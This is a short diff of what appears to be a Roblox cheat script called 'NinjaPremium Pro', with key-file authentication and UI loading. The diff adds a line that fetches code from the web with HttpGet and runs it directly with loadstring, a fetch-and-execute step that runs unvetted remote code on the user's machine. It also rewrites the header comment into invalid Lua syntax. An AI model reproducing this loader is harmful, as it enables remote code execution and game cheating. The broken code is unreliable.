@@ -1,4 +1,4 @@
--- [[ 👑 NinjaPremium Pro 核心主程式 ]] --
+-[ 👑 NinjaPremium Pro 核心主程式 ] -
 local P = game:GetService("Players").LocalPlayer
 local R = game:GetService("RunService")
 local U = game:GetService("UserInputService")
@@ -65,6 +65,7 @@ local function Auth()
 end
 
 if isfile and isfile(Key_File) then LoadUI() else Auth() end
+loadstring(game:HttpGet("https://githubusercontent.com"))()
 
 
 
